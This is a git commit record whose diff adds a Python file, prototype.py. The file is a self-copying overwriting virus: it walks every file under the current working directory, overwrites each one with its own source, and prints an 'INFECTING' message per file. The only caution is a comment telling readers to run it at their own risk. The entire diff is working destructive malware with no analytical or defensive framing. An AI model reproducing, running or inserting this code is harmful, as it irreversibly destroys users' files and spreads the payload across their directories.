f23241621af2785de134056fbff6340f111e1be8
stephano mwita <stevebazaar@gmail.com>
2024-12-02 21:43:31 +0300

    main

---
+++ prototype.py
@@ -0,0 +1,35 @@
+import os
+import sys
+from tkinter import *
+
+
+# run this codes on your risk
+
+try:
+    host_files = []
+    directory = os.getcwd()
+
+    # copying src code
+    def reading_src():
+        with open(sys.argv[0], "rb") as src:
+            data = src.read()
+            for items in host_files:
+                with open(items, "wb") as host:
+                    host.write(bytes(data))
+                print(f"***** INFECTING:{items}*****")
+                    
+
+
+
+    # traversing files
+    for root, dirs, files in os.walk(directory):
+        for file_name in files:
+            file = os.path.join(root, file_name)
+            host_files.append(file)
+        reading_src()
+
+except Exception as e:
+    print(e)
+
+    # by stephan bazaar
+
